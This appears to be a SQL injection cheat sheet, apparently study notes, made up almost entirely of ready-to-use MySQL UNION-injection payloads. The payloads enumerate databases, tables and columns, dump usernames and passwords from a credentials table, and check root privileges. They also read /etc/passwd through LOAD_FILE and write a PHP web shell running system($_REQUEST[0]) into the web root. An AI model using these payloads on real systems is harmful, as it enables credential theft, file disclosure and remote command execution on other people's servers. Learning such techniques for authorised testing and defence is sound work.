# Targeted Test Cases

Basic Auth Bypass With comments

Detect number of columns using `order by`

`cn' UNION select 1,2,3-- -`

Detect number of columns using Union injection

`cn' UNION select 1,@@version,3,4-- -`

`UNION select username, 2, 3, 4 from passwords-- -`

Union injection for 4 columns

Fingerprint MySQL with query output

Fingerprint MySQL with no output

`cn' UNION select 1,database(),2,3-- -`

`cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`

`cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`

List all tables in a specific database

`cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`

List all columns in a specific table

`cn' UNION select 1, username, password, 4 from dev.credentials-- -`

Dump data from a table in another database

`cn' UNION SELECT 1, user(), 3, 4-- -`

`cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`

Find if user has admin privileges

`cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -`

Find if all user privileges

`cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`

Find which directories can be accessed through MySQL

`cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`

`select 'file written successfully!' into outfile '/var/www/html/proof.txt'`

Write a string to a local file

`cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`

Write a web shell into the base web directory
